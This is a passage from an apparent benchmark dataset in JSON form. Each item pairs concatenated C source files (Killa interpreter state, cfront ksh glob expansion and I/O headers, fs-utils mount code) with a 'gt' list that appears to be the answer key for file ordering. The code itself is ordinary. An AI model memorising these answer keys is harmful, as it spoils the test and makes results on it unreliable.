{\n  killa_State *L1;\n  killa_lock(L);\n  killaC_checkGC(L);\n  L1 = &killaC_newobj(L, KILLA_TTHREAD, sizeof(LX), NULL, offsetof(LX, l))->th;\n  killa_setthvalue(L, L->top, L1);\n  killaA_incr_top(L);\n  preinit_state(L1, KILLA_G(L));\n  L1->hookmask = L->hookmask;\n  L1->basehookcount = L->basehookcount;\n  L1->hook = L->hook;\n  killa_resethookcount(L1);\n  killai_userstatethread(L, L1);\n  stack_init(L1, L);\n  killa_unlock(L);\n  return L1;\n}\n\n\nvoid killaE_freethread (killa_State *L, killa_State *L1) {\n  LX *l = fromstate(L1);\n  killaF_close(L1, L1->stack);\n  killa_assert(L1->openupval == NULL);\n  killai_userstatefree(L, L1);\n  freestack(L1);\n  killaM_free(L, l);\n}\n\n\nKILLA_API killa_State *killa_newstate (killa_Alloc f, void *ud) {\n  int i;\n  killa_State *L;\n  killa_GlobalState *g;\n  LG *l = killa_cast(LG *, (*f)(ud, NULL, KILLA_TTHREAD, sizeof(LG)));\n  if (l == NULL) return NULL;\n  L = &l->l.l;\n  g = &l->g;\n  L->next = NULL;\n  L->tt = KILLA_TTHREAD;\n  g->currentwhite = killa_bit2mask(KILLA_WHITE0BIT, KILLA_FIXEDBIT);\n  L->marked = killaC_white(g);\n  g->gckind = KILLA_KGC_NORMAL;\n  preinit_state(L, g);\n  g->frealloc = f;\n  g->ud = ud;\n  g->mainthread = L;\n  g->uvhead.u.l.prev = &g->uvhead;\n  g->uvhead.u.l.next = &g->uvhead;\n  g->gcrunning = 0;\n  g->lastmajormem = 0;\n  g->strt.size = 0;\n  g->strt.nuse = 0;\n  g->strt.hash = NULL;\n  killa_setnilvalue(&g->l_registry);\n  killaZ_initbuffer(L, &g->buff);\n  g->panic = NULL;\n  g->version = killa_version(NULL);\n  g->gcstate = killa_GCSpause;\n  g->allgc = NULL;\n  g->finobj = NULL;\n  g->tobefnz = NULL;\n  g->gray = g->grayagain = NULL;\n  g->weak = g->ephemeron = g->allweak = NULL;\n  g->totalbytes = sizeof(LG);\n  g->GCdebt = 0;\n  g->gcpause = KILLAI_GCPAUSE;\n  g->gcmajorinc = KILLAI_GCMAJOR;\n  g->gcstepmul = KILLAI_GCMUL;\n  for (i=0; i < KILLA_NUMTAGS; i++) g->mt[i] = NULL;\n  if (killaD_rawrunprotected(L, f_killaopen, NULL) != KILLA_OK) {\n\n    close_state(L);\n    L = NULL;\n  }\n  else\n    killai_userstateopen(L);\n  return L;\n}\n\n\nKILLA_API void killa_close (killa_State *L) {\n  L = KILLA_G(L)->mainthread;\n  killa_lock(L);\n  killai_userstateclose(L);\n  close_state(L);\n}\n\n\n",
        "gt": [
            "'Killa/src/klimits.h'",
            "'Killa/src/kapi.h'",
            "'Killa/src/kstate.c'"
        ]
    },
    {
        "files": [
            "'cfront-3/libSC/Path/ksh/io.h'",
            "'cfront-3/libSC/Path/ksh/expand.c'",
            "'cfront-3/libSC/Path/ksh/sh_config.h'"
        ],
        "content": "'cfront-3/libSC/Path/ksh/io.h'\n:\n\n\n#include\t\"sh_config.h\"\n#include\t<sys/stat.h>\n#ifdef _unistd_\n#   include\t<unistd.h>\n#   ifdef R_OK_fcntl_h\n#\t\tundef F_OK\n#\t\tundef R_OK\n#\t\tundef W_OK\n#\t\tundef X_OK\n#   endif\n#endif\n#ifdef _fcntl_\n#   include\t<fcntl.h>\n#endif\n#ifndef\tO_CREAT\n#   ifdef _sys_file_\n#\tifdef R_OK_file_h\n#\t\tundef F_OK\n#\t\tundef R_OK\n#\t\tundef W_OK\n#\t\tundef X_OK\n#\tendif\n#\tinclude\t<sys/file.h>\n#   endif\n#endif\n\n#ifndef NFILE\n#   define NFILE\t20\n#endif\n#ifndef IOBSIZE\n#   define  IOBSIZE\t1024\n#endif\n#ifndef EOF\n#   define EOF\t\t(-1)\n#endif\n#define MAXTRY\t\t12\n#ifdef SEVENBIT\n#   define STRIP\t0177\n#else\n#   define STRIP\t0377\n#endif\n\n\n#define TMPSIZ\t\t20\n#define ERRIO\t\t2\n#define USERIO\t\t10\n#define FCIO\t\t(NFILE-1)\n#ifdef KSHELL\n#   define INIO\t\t(NFILE-2)\n#   define TMPIO\t(NFILE-3)\n#   define CINPIPE\t(NFILE-4)\n#   define CINPIPE2\t(NFILE-5)\n#   define COTPIPE\t(NFILE-6)\n#   define MAXFILES\t(NFILE-USERIO)\n\n#   define F_STRING\t((unsigned char)NFILE)\n#   define F_INFINITE\t0x7fff\n#endif\n\n\nstruct fileblk\n{\n\tchar\t\t*ptr;\n\tchar\t\t*base;\n\tchar\t\t*last;\n\toff_t\t\tfseek;\n\tint\t\tflag;\n\tunsigned char\tfdes;\n#ifdef KSHELL\n\tchar\t\tftype;\n\tint\t\tflast;\n\tchar\t\t**feval;\n\tstruct fileblk\t*fstak;\n\tunsigned\tflin;\n#endif\n};\n\n#define filenum(fp)\t((int)(fp->fdes))\n#define fnobuff(fp)\t((fp)->flag&IONBF)\n\n#define IOREAD\t0001\n#define IOWRT\t0002\n#define IONBF\t0004\n#define IOFREE\t0010\n#define IOEOF\t0020\n#define IOERR\t0040\n#define IORW\t0100\n#define IOSLOW\t0200\n#define IOEDIT\t0400\n\nextern struct fileblk *io_ftable[NFILE];\n\n#ifdef\tFNDELAY\n#   undef EAGAIN\n#   define EAGAIN\tEWOULDBLOCK\n#   undef O_NONBLOCK\n#   undef O_NDELAY\n#   define O_NONBLOCK\tFNDELAY\n#endif\n#ifndef\tO_CREAT\n#   define\tO_CREAT\t\t0400\n#   define\tO_TRUNC\t\t01000\n#   define\tO_APPEND\t010\n#endif\n#ifndef O_RDWR\n#   define\tO_RDONLY\t0\n#   define\tO_WRONLY\t01\n#   define\tO_RDWR\t\t02\n#endif\n#ifdef NOFCNTL\n#   define\topen\t\tmyopen\n#   define\tF_DUPFD\t\t0\n#   define\tF_GETFD\t\t1\n#   define\tF_SETFD\t\t2\n#endif\n#ifndef R_OK\n#   define F_OK \t   0\n#   define X_OK \t   1\n#   define W_OK \t   2\n#   define R_OK \t   4\n#endif\n#ifndef SEEK_SET\n#   define SEEK_SET\t   0\n#   define SEEK_CUR\t   1\n#   define SEEK_END\t   2\n#endif\n#ifdef S_IRUSR\n#   define RW_ALL\t(S_IRUSR|S_IRGRP|S_IROTH|S_IWUSR|S_IWGRP|S_IWOTH)\n#else\n#   define RW_ALL\t0666\n#endif\n\n\n\n#define INPIPE\t0\n#define OTPIPE\t1\n#define DUPFLG\t0100\n\n\n\n#ifdef KSHELL\n\n#define\tF_ISSTRING\t1\n#define F_ISFILE\t2\n#define F_ISALIAS\t3\n#define F_ISEVAL\t4\n\n\n\nunion io_eval\n{\n\tint \tfd;\n\tchar\t**com;\n};\n\n#define io_unreadc(c)\t(st.peekn |= (c)|MARK)\n#define input\t\t(st.curin)\n#define output\t\t(sh.curout)\n#define newline()\tp_char(NL)\n#define fisopen(fd)\t(io_access(fd,F_OK)==0)\n#define fiswrite(fd)\t(io_access(fd,W_OK)==0)\n#define fisread(fd)\t(io_access(fd,R_OK)==0)\n#define fiseof(fp)\t((fp)->flag&IOEOF)\n#define fiserror(fp)\t((fp)->flag&IOERR)\n#define nextchar(fp)\t(*((fp)->ptr))\n#define finbuff(fp)\t((fp)->last - (fp)->ptr)\n#ifndef clearerr\n#   define clearerr(fp)\t((fp)->flag &= ~(IOERR|IOEOF))\n#endif\n\nstruct filesave\n{\n\tshort\torg_fd;\n\tshort\tdup_fd;\n};\n\n\n#ifdef PROTO\n    extern off_t\tlseek(int,off_t,int);\n    extern void\t\tio_clear(struct fileblk*);\n    extern void \tio_fclose(int);\n    extern int\t\tio_getc(int);\n    extern void \tio_init(int,struct fileblk*,char*);\n    extern int\t\tio_intr(struct fileblk*);\n    extern void \tio_push(struct fileblk*);\n    extern int\t\tio_pop(int);\n    extern int\t\tio_mktmp(char*);\n    extern off_t\tio_seek(int,off_t,int);\n    extern int\t\tio_readbuff(struct fileblk*);\n    extern int\t\tio_readc(void);\n    extern int\t\tio_renumber(int,int);\n    extern void \tio_sync(void);\n    extern void \tio_popen(int[]);\n    extern void \tio_pclose(int[]);\n    extern void \tio_restore(int);\n   struct ionod;\n    extern int\t\tio_redirect(struct ionod*,int);\n    extern void \tio_save(int,int);\n    extern void \tio_rmtemp(struct ionod*);\n    extern void \tio_linkdoc(struct ionod*);\n    extern void \tio_swapdoc(struct ionod*);\n    extern int\t\tio_fopen(const char*);\n    extern void \tio_sopen(char*);\n    extern int\t\tio_access(int,int);\n    extern int\t\tio_nextc(void);\n    extern int\t\tispipe(int);\n#else\n    extern off_t\tlseek();\n    extern void \tio_clear();\n    extern void \tio_fclose();\n    extern int\t\tio_getc();\n    extern void \tio_init();\n    extern int\t\tio_intr();\n    extern void \tio_push();\n    extern int\t\tio_pop();\n    extern int\t\tio_mktmp();\n    extern off_t\tio_seek();\n    extern int\t\tio_readbuff();\n    extern int\t\tio_readc();\n    extern int\t\tio_renumber();\n    extern void \tio_sync();\n    extern void \tio_popen();\n    extern void \tio_pclose();\n    extern void \tio_restore();\n    extern int\t\tio_redirect();\n    extern void \tio_save();\n    extern void \tio_rmtemp();\n    extern void \tio_linkdoc();\n    extern void \tio_swapdoc();\n    extern int\t\tio_fopen();\n    extern void \tio_sopen();\n    extern int\t\tio_access();\n    extern int\t\tio_nextc();\n    extern int\t\tispipe();\n#endif\nextern void\tio_settemp();\n\nextern char _sibuf[];\nextern char\t_sobuf[];\nextern struct fileblk\tio_stdin;\nextern struct fileblk\tio_stdout;\nextern char\tio_tmpname[];\n\n\nextern const char\te_create[];\nextern const char\te_file[];\nextern const char\te_open[];\nextern const char\te_pipe[];\nextern const char\te_flimit[];\nextern const char\te_fexists[];\nextern const char\te_unknown[];\nextern const char\te_endoffile[];\nextern const char\te_devnull[];\nextern const char\te_profile[];\nextern const char\te_suidprofile[];\nextern const char\te_sysprofile[];\nextern const char\te_devfdNN[];\n#ifdef SUID_EXEC\n    extern const char\te_suidexec[];\n#endif\n#endif\n\n'cfront-3/libSC/Path/ksh/expand.c'\n:\n\n\n#include\t\"sh_config.h\"\n#ifdef KSHELL\n#   include\t\"defs.h\"\n#else\n#include <sys/file.h>\n#include <sys/param.h>\n#include <stdio.h>\n#include \"io.h\"\n#   ifdef _unistd_\n#\tinclude\t<unistd.h>\n#   endif\n#endif\n\n#ifdef FS_3D\n#   undef _ndir_\n#   define _dirent_ 1\n#endif\n#ifdef _ndir_\n#   undef\tdirect\n#   define direct dirent\n#   include\t<ndir.h>\n#else\n#   undef\tdirent\n#   ifndef FS_3D\n#     ifndef _AIX\n#\tdefine dirent direct\n#     endif\n#   endif\n#endif\n\n#include <dirent.h>\n\n#ifdef KSHELL\n#   define check_signal()\t(sh.trapnote&SIGSET)\n#    define argbegin\targnxt.cp\n    extern char\t*strrchr();\n    int\t\tpath_expand_Path_ATTLC();\n    void\trm_files();\n    int\t\tf_complete();\n    static\tchar\t*sufstr;\n    static\tint\tsuflen;\n#else\n#   define check_signal()\t(0)\n\n#   define round(x,y)\t\t(((int)(x)+(y)-1)&~((y)-1))\n#   define sh_access_Path_ATTLC\t\t_sh_access_Path_ATTLC\n#   define suflen\t\t0\n    struct argnod\n    {\n\tstruct argnod\t*argbegin;\n\tstruct argnod\t*argchn;\n\tchar\t\targval[1];\n    };\n    static void \tsh_trim();\n    static char\t\t*sh_copy();\n    static char\t\t*stak_begin();\n    static void\t\tstak_end();\n    static char \t*stak_alloc();\n    static int\t\ttest_type();\n#endif\n\n\n\n\nstruct glob\n{\n\tint\t\targn;\n\tstruct argnod\t*rescan;\n\tstruct argnod\t*match;\n#ifndef KSHELL\n\tvoid\t\t(*found)();\n\tchar *\t\t(*alloc)();\n\tvoid\t\t(*shrink)();\n#endif\n};\n\n\n#define GLOB_RESCAN 1\n#define\targstart(ap)\t((ap)->argbegin)\n#define globptr()\t((struct glob*)membase)\n\nstatic struct glob\t *membase;\n\nstatic void\t\taddmatch();\nstatic void\t\tglob_dir();\nextern int\t\tstrmatch_Path_ATTLC();\nchar * malloc();\n\n#ifndef MAXPATHLEN\n#define MAXPATHLEN 1024\n#endif\n\nint path_expand_Path_ATTLC(pattern, found, poolcreate, alloc, shrink)\nchar *pattern;\nvoid\t\t(*found)();\nvoid\t\t(*poolcreate)();\nchar *\t\t(*alloc)();\nvoid\t\t(*shrink)();\n{\n\tregister struct argnod *ap;\n\tregister struct argnod *dma;\n\tregister struct glob *gp;\n\tstruct glob globdata;\n\tmembase = &globdata;\n\tgp = globptr();\n#ifndef KSHELL\n\n\n\t(*poolcreate)(sizeof(struct argnod) + MAXPATHLEN + 1 + 5, sizeof(struct argnod) + 10 + 1);\n\tgp->found = found;\n\tgp->alloc = alloc;\n\tgp->shrink = shrink;\n\n#endif\n\tap = (struct argnod*)stak_alloc(strlen(pattern)+sizeof(struct argnod)+suflen);\n\tgp->rescan =  ap;\n\tgp->argn = 0;\n#ifdef KSHELL\n\tgp->match = st.gchain;\n#else\n\tgp->match = 0;\n#endif\n\tap->argbegin = (struct argnod *)ap->argval;\n\tap->argchn = 0;\n#ifdef KSHELL\n\tpattern = sh_copy(pattern,ap->argval);\n\tif(suflen)\n\t\tsh_copy(sufstr,pattern);\n\tsuflen = 0;\n#else\n\tsh_copy(pattern,ap->argval);\n#endif\n\tdma = ap;\n\tdo\n\t{\n\t\tgp->rescan = ap->argchn;\n\t\tglob_dir(ap);\n\t}\n\twhile(ap = gp->rescan);\n#ifdef KSHELL\n\tst.gchain = gp->match;\n#endif\n\tfree (dma);\n\treturn(gp->argn);\n}\n\nstatic void glob_dir(ap)\nstruct argnod *ap;\n{\n\tregister char\t*rescan;\n\tregister char\t*prefix;\n\tregister char\t*pat;\n\tDIR \t\t*dirf;\n\tchar\t\tquote = 0;\n\tchar\t\tsavequote = 0;\n\tchar\t\tmeta = 0;\n\tchar\t\tbracket = 0;\n\tchar\t\tfirst;\n\tchar\t\t*dirname;\n\tstruct dirent\t*dirp;\n\tif(check_signal())\n\t\treturn;\n\tpat = rescan = (char *)argstart(ap);\n\tprefix = dirname = ap->argval;\n\tfirst = (rescan == prefix);\n\n\twhile(1) switch(*rescan++)\n\t{\n\t\tcase 0:\n\t\t\trescan = 0;\n\t\t\tif(meta)\n\t\t\t\tgoto process;\n\n\t\t\tif(quote)\n\t\t\t\tsh_trim(argstart(ap));\n\n\t\t\tif(sh_access_Path_ATTLC(prefix,F_OK,1)==0)\n\t\t\t\taddmatch((char*)0,prefix,(char*)0);\n\t\t\treturn;\n\n\t\tcase '/':\n\t\t\tif(meta)\n\t\t\t\tgoto process;\n\t\t\tpat = rescan;\n\t\t\tbracket = 0;\n\t\t\tsavequote = quote;\n\t\t\tbreak;\n\n\t\tcase '[':\n\t\t\tbracket = 1;\n\t\t\tbreak;\n\n\t\tcase ']':\n\t\t\tmeta |= bracket;\n\t\t\tbreak;\n\n\t\tcase '*':\n\t\tcase '?':\n\t\t\tif (!bracket)\n\t\tcase '(':\n\t\t\t\tmeta=1;\n\t\t\tbreak;\n\n\t\tcase '\\\\':\n\t\t\tquote = 1;\n\t\t\trescan++;\n\t}\nprocess:\n\tif(pat == prefix)\n\t{\n\t\tdirname = \".\";\n\t\tprefix = 0;\n\t}\n\telse\n\t{\n\t\tif(pat==prefix+1)\n\t\t\tdirname = \"/\";\n\t\t*(pat-1) = 0;\n\t\tif(savequote)\n\t\t\tsh_trim(argstart(ap));\n\t}\n\tif(dirf=opendir(dirname))\n\t{\n\n\t\tif(rescan)\n\t\t\t*(rescan-1) = 0;\n\t\twhile(dirp = readdir(dirf))\n\t\t{\n\t\t\tif(dirp->d_ino==0 || (*dirp->d_name=='.' && *pat!='.'))\n\t\t\t\tcontinue;\n\t\t\tif(strmatch_Path_ATTLC(dirp->d_name, pat))\n\n\t\t\t\taddmatch(prefix,dirp->d_name,rescan);\n\n\t\t}\n\t\tclosedir(dirf);\n\t}\n\treturn;\n}\n\nstatic  void addmatch(dir,pat,rescan)\nchar *dir, *pat, *rescan;\n{\n\tregister struct argnod *ap = (struct argnod*)stak_begin();\n\tregister struct glob *gp = globptr();\n\tregister char *cp = ap->argval;\n#ifdef KSHELL\n\tap->argflag = A_RAW;\n#endif\n\tif(dir)\n\t{\n\t\tcp = sh_copy(dir,cp);\n\t\t*cp++ = '/';\n\t}\n\tcp = sh_copy(pat,cp);\n\tif(rescan)\n\t{\n\t\tif(test_type(ap->argval,S_IFMT,S_IFDIR)==0)\n\t\t\treturn;\n\t\t*cp++ = '/';\n\t\tap->argbegin = (struct argnod *)cp;\n\t\tcp = sh_copy(rescan,cp);\n\t\tap->argchn = gp->rescan;\n\t\tgp->rescan = ap;\n\t}\n\telse\n\t{\n#ifdef KSHELL\n\t\tif(is_option(MARKDIR) && test_type(ap->argval,S_IFMT,S_IFDIR))\n\t\t\t*cp++ = '/';\n#endif\n\t\tap->argchn = gp->match;\n\t\tgp->match = ap;\n\t\t(*gp->found)(ap->argval);\n\n\t\tgp->argn++;\n\t}\n\tstak_end(cp);\n}\n\n\n#ifdef KSHELL\n\n\n\nvoid\trm_files(template)\nregister char *template;\n{\n\tregister char *cp;\n\tstruct argnod  *schain;\n\tcp = strrchr(template,'.');\n\t*(cp+1) = 0;\n\tf_complete(template,\"*\");\n\tschain = st.gchain;\n\twhile(schain)\n\t{\n\t\tunlink(schain->argval);\n\t\tschain = schain->argchn;\n\t}\n}\n\n\n\nf_complete(name,suffix)\nchar *name;\nregister char *suffix;\n{\n\tst.gchain =  0;\n\tsufstr = suffix;\n\tsuflen = strlen(suffix);\n\treturn(path_expand_Path_ATTLC(name));\n}\n\n#else\n\nstatic char *sh_copy(sp,dp)\nregister char *sp;\nregister char *dp;\n{\n\twhile(1)\n\t{\n\t\tif((*dp = *sp++)==0)\n\t\t\treturn(dp);\n\t\tdp++;\n\t}\n}\n\nstatic char * stak_alloc(asize)\nunsigned asize;\n{\n\treturn malloc(asize);\n}\n\nstatic char *begin;\n\nstatic char * stak_begin()\n{\n\tregister struct glob *gp = globptr();\n\tbegin = (*gp->alloc)();\n\treturn begin;\n}\n\nstatic void stak_end(x)\nchar *x;\n{\n\tregister struct glob *gp = globptr();\n\t*x = 0;\n\t(*gp->shrink)(begin, x-begin+1);\n}\n\n\n\nstatic test_type(f,mask,field)\nchar *f;\nint field;\n{\n\tstatic struct stat statb;\n\n\tif(f && stat(f,&statb)<0)\n\t\treturn(0);\n\treturn((statb.st_mode&mask)==field);\n}\n\n\n\nstatic void sh_trim(sp)\nregister char *sp;\n{\n\tregister char *dp = sp;\n\tregister int c;\n\twhile(1)\n\t{\n\t\tif((c= *sp++) == '\\\\')\n\t\t\tc = *sp++;\n\t\t*dp++ = c;\n\t\tif(c==0)\n\t\t\tbreak;\n\t}\n}\n#endif\n\n#ifdef OLDSYS5\n\nstatic DIR dirbuff;\n\nstatic DIR *opendir(name)\nchar *name;\n{\n\tregister int fd;\n\tstruct stat statb;\n\tif((fd = open(name,0)) < 0)\n\t\treturn(0);\n\tif(fstat(fd,&statb) < 0 || (statb.st_mode&S_IFMT)!= S_IFDIR)\n\t{\n\t\tclose(fd);\n\t\treturn(0);\n\t}\n\tdirbuff.fd = fd;\n\tdirbuff.next = dirbuff.last = dirbuff.entries + NDENTS;\n\treturn(&dirbuff);\n}\n\nstatic struct direct *readdir(dir)\nregister DIR *dir;\n{\n\tregister int n;\n\tstruct direct *dp;\n\tif(dir->next >= dir->last)\n\t{\n\t\tn = read(dir->fd,(char*)dir->entries,NDENTS*sizeof(struct direct));\n\t\tn /= sizeof(struct direct);\n\t\tif(n <=0)\n\t\t\treturn(0);\n\t\tdir->next = dir->entries;\n\t\tdir->last = dir->entries + n;\n\t}\n\telse\n\t\tdir->next->d_ino =  dir->save;\n\tdp = (struct direct*)dir->next++;\n\tdir->save = dir->next->d_ino;\n\tdir->next->d_ino = 0;\n\treturn(dp);\n}\n#endif\n\n#ifdef BRACEPAT\nint expbrace(todo)\nstruct argnod *todo;\n\n{\n\tregister char *cp;\n\tregister int brace;\n\tregister struct argnod *ap;\n\tstruct argnod *top = 0;\n\tstruct argnod *apin;\n\tchar *pat, *rescan;\n\tchar *sp;\n\tchar comma;\n\tint count = 0;\n\ttodo->argchn = 0;\nagain:\n\tapin = ap = todo;\n\ttodo = ap->argchn;\n\tcp = ap->argval;\n\tcomma = brace = 0;\n\n\twhile(1) switch(*cp++)\n\t{\n\t\tcase '{':\n\t\t\tif(brace++==0)\n\t\t\t\tpat = cp;\n\t\t\tbreak;\n\t\tcase '}':\n\t\t\tif(--brace>0)\n\t\t\t\tbreak;\n\t\t\tif(brace==0 && comma)\n\t\t\t\tgoto endloop1;\n\t\t\tcomma = brace = 0;\n\t\t\tbreak;\n\t\tcase ',':\n\t\t\tif(brace==1)\n\t\t\t\tcomma = 1;\n\t\t\tbreak;\n\t\tcase '\\\\':\n\t\t\tcp++;\n\t\t\tbreak;\n\t\tcase 0:\n\n\t\t\tap->argchn = top;\n\t\t\ttop = ap;\n\t\t\tif(todo)\n\t\t\t\tgoto again;\n\t\t\tfor(; ap; ap=apin)\n\t\t\t{\n\t\t\t\tapin = ap->argchn;\n\t\t\t\tif((brace = path_expand_Path_ATTLC(ap->argval)))\n\t\t\t\t\tcount += brace;\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tap->argchn = st.gchain;\n\t\t\t\t\tst.gchain = ap;\n\t\t\t\t\tcount++;\n\t\t\t\t}\n\t\t\t\tst.gchain->argflag |= A_MAKE;\n\t\t\t}\n\t\t\treturn(count);\n\t}\nendloop1:\n\trescan = cp;\n\tcp = pat-1;\n\t*cp = 0;\n\twhile(1)\n\t{\n\t\tbrace = 0;\n\n\t\twhile(1) switch(*++cp)\n\t\t{\n\t\t\tcase '\\\\':\n\t\t\t\tcp++;\n\t\t\t\tbreak;\n\t\t\tcase '{':\n\t\t\t\tbrace++;\n\t\t\t\tbreak;\n\t\t\tcase ',':\n\t\t\t\tif(brace==0)\n\t\t\t\t\tgoto endloop2;\n\t\t\t\tbreak;\n\t\t\tcase '}':\n\t\t\t\tif(--brace<0)\n\t\t\t\t\tgoto endloop2;\n\t\t}\n\tendloop2:\n\n\t\tif(*cp != '}')\n\t\t\tap = (struct argnod*)stak_begin();\n\t\telse\n\t\t\tap = apin;\n\t\t*cp = 0;\n\t\tsp = sh_copy(apin->argval,ap->argval);\n\t\tsp = sh_copy(pat,sp);\n\t\tsp = sh_copy(rescan,sp);\n\t\tap->argchn = todo;\n\t\ttodo = ap;\n\t\tif(ap == apin)\n\t\t\tbreak;\n\t\tstak_end(sp);\n\t\tpat = cp+1;\n\t}\n\tgoto again;\n}\n#endif\n\n'cfront-3/libSC/Path/ksh/sh_config.h'\n:\n#ifndef _sh_config\n#define _sh_config 1\n\n#include\t<sys/types.h>\n#include\t<sys/param.h>\n\n#define VOID\tvoid\n#if 0\ntypedef int pid_t;\ntypedef long clock_t;\n#endif\n#define const\n\n#endif\n",
        "gt": [
            "'cfront-3/libSC/Path/ksh/sh_config.h'",
            "'cfront-3/libSC/Path/ksh/io.h'",
            "'cfront-3/libSC/Path/ksh/expand.c'"
        ]
    },
    {
        "files": [
            "'fs-utils/lib/filesystems.h'",
            "'fs-utils/lib/mount_ext2fs.h'",
            "'fs-utils/lib/fsu_mount.c'"
        ],
        "content": "'fs-utils/lib/filesystems.h'\n:\n\n\n#ifndef _FILESYSTEMS_H_\n#define _FILESYSTEMS_H_\n\n\n\n\n#ifdef __NetBSD__\n#include <isofs/cd9660/cd9660_mount.h>\n#include <fs/efs/efs_mount.h>\n#include <ufs/ufs/ufsmount.h>\n#include <fs/hfs/hfs.h>\n#include <msdosfs/msdosfsmount.h>\n#include <ntfs/ntfsmount.h>\n#include <fs/sysvbfs/sysvbfs_args.h>\n#include <fs/tmpfs/tmpfs_args.h>\n#include <fs/udf/udf_mount.h>\n#include <fs/v7fs/v7fs_args.h>\n#include <nfs/nfsmount.h>\n#ifdef WITH_SMBFS\n#include <smbfs.h>\n#include <netsmb/smb_lib.h>\n#endif\n#else\n#include \"nb_fs.h\"\n#endif\n\n\n#include \"mount_cd9660.h\"\n#include \"mount_efs.h\"\n#include \"mount_ext2fs.h\"\n#include \"mount_ffs.h\"\n#include \"mount_hfs.h\"\n#include \"mount_lfs.h\"\n#include \"mount_msdos.h\"\n#include \"mount_ntfs.h\"\n#include \"mount_sysvbfs.h\"\n#include \"mount_tmpfs.h\"\n#include \"mount_udf.h\"\n#include \"mount_kernfs.h\"\n#include \"mount_v7fs.h\"\n#include \"mount_nfs.h\"\n#ifdef WITH_SYSPUFFS\n#include \"rump_syspuffs.h\"\n#endif\n#ifdef WITH_SMBFS\n#include \"mount_smbfs.h\"\n#endif\n\ntypedef int (*parseargs_fp)(int, char **, void *, int *, char *, char *);\n\ntypedef struct fsu_fs_s {\n\tconst char *fs_name;\n\tvoid *fs_args;\n\tunsigned int fs_args_size;\n\tparseargs_fp fs_parseargs;\n\tunsigned int fs_flags;\n#define FS_NO_AUTO (1)\n} fsu_fs_t;\n\n#define FS(a, b, c, d, e)\t\t\t\t\t\t      \\\n\t{ MOUNT_##a, &_args.args_##b, sizeof(struct c),\t\t\t      \\\n\t\t    (parseargs_fp)mount_##d##_parseargs, e }\n\nunion fsu_args {\n\tstruct iso_args args_cd9660;\n\tstruct efs_args args_efs;\n\tstruct ufs_args args_ufs;\n\tstruct hfs_args args_hfs;\n\tstruct msdosfs_args args_msdos;\n\tstruct ntfs_args args_ntfs;\n\tstruct sysvbfs_args args_sysvbfs;\n\tstruct tmpfs_args args_tmpfs;\n\tstruct udf_args args_udf;\n\tstruct v7fs_args args_v7fs;\n\tstruct nfs_args args_nfs;\n#ifdef WITH_SYSPUFFS\n\tstruct syspuffs_args args_syspuffs;\n#endif\n#ifdef WITH_SMBFS\n\tstruct smbfs_args args_smbfs;\n#endif\n} _args;\n\n#define FSU_ISDISKFS(fsufs) ((fsufs->fs_flags & FS_NO_AUTO) == 0)\n\n\nfsu_fs_t fslist[] = {\n\n\tFS(CD9660,\tcd9660,\tiso_args,\tcd9660,\t\t0),\n\tFS(EXT2FS,\tufs,\tufs_args,\text2fs,\t\t0),\n\tFS(FFS,\t\tufs,\tufs_args,\tffs,\t\t0),\n#ifndef __linux__\n\tFS(HFS,\t\thfs,\thfs_args,\thfs,\t\t0),\n#endif\n\tFS(LFS,\t\tufs,\tufs_args,\tlfs,\t\t0),\n\tFS(MSDOS,\tmsdos,\tmsdosfs_args,\tmsdos,\t\t0),\n\tFS(NTFS,\tntfs,\tntfs_args,\tntfs,\t\t0),\n\tFS(UDF,\t\tudf,\tudf_args,\tudf,\t\t0),\n\tFS(EFS,\t\tefs,\tefs_args,\tefs,\t\t0),\n\tFS(SYSVBFS,\tsysvbfs, sysvbfs_args,\tsysvbfs,\t0),\n\tFS(V7FS,\tv7fs, v7fs_args,\tv7fs,\t\t0),\n\tFS(TMPFS,\ttmpfs,\ttmpfs_args,\ttmpfs,\t\tFS_NO_AUTO),\n\tFS(NFS,\t\tnfs,\tnfs_args,\tnfs,\t\tFS_NO_AUTO),\n#ifdef WITH_SYSPUFFS\n\tFS(PUFFS,\tsyspuffs, syspuffs_args, syspuffs,\tFS_NO_AUTO),\n#endif\n#ifdef WITH_SMBFS\n\tFS(SMBFS,\tsmbfs,\tsmbfs_args,\tsmbfs,\t\tFS_NO_AUTO),\n#endif\n\t{ MOUNT_KERNFS, NULL, 0, (parseargs_fp)mount_kernfs_parseargs, FS_NO_AUTO },\n\t{ NULL,\t\tNULL,\t\t\t0,  NULL, 0 }\n};\n\n#endif\n\n'fs-utils/lib/mount_ext2fs.h'\n:\n\n\n\n#ifndef _SBIN_MOUNT_EXT2FS_MOUNT_EXT2FS_H_\n#define _SBIN_MOUNT_EXT2FS_MOUNT_EXT2FS_H_\n\nstruct ufs_args;\n\nint\tmount_ext2fs_parseargs(int, char **, struct ufs_args *, int *,\n\t\t\t       char *, char *);\n\n#endif\n\n'fs-utils/lib/fsu_mount.c'\n:\n\n\n\n#include \"fs-utils.h\"\n\n#include <sys/mount.h>\n#include <sys/stat.h>\n\n#if HAVE_NBCOMPAT_H\n#include <nbcompat.h>\n#endif\n\n#include <dlfcn.h>\n#include <errno.h>\n#include <limits.h>\n#include <stdbool.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\n#include <rump/rump.h>\n#include <rump/rump_syscalls.h>\n\n#include <fsu_utils.h>\n\n#include \"fsu_mount.h\"\n\n#include \"filesystems.h\"\n#include \"fsu_alias.h\"\n\n#define MOUNT_DIRECTORY \"/mnt\"\n\n#define RUMPFSDEV \"/dev/rumpfs\"\n\n#ifndef __UNCONST\n#define __UNCONST(a) ((char *)(unsigned long)(const char *)(a))\n#endif\n\n#ifdef __linux__\n#define GETOPT_PREFIX \"+\"\n#else\n#define GETOPT_PREFIX\n#endif\n\n#define ADD_ARG(m, a)\t\t\t\t\t\\\n    do {\t\t\t\t\t\t\\\n\tchar *_tmp = (a);\t\t\t\t\\\n\tif ((_tmp) == NULL) {\t\t\t\t\\\n\t\twarn(NULL);\t\t\t\t\\\n\t\treturn -1;\t\t\t\t\\\n\t}\t\t\t\t\t\t\\\n\t(m)->mntd_argv[(m)->mntd_argc++] = (_tmp);\t\\\n    } while (0)\nstruct mount_data_s {\n\tfsu_fs_t *mntd_fs;\n\tchar mntd_canon_dev[PATH_MAX];\n\tchar mntd_canon_dir[PATH_MAX];\n\tchar *mntd_fsdevice;\n\tint mntd_flags;\n\tint mntd_argc;\n\tchar **mntd_argv;\n\tint mntd_argv_size;\n};\n\nstatic int mount_alias(struct fsu_fsalias_s *, char *, char *,\n    struct mount_data_s *, int);\nstatic int 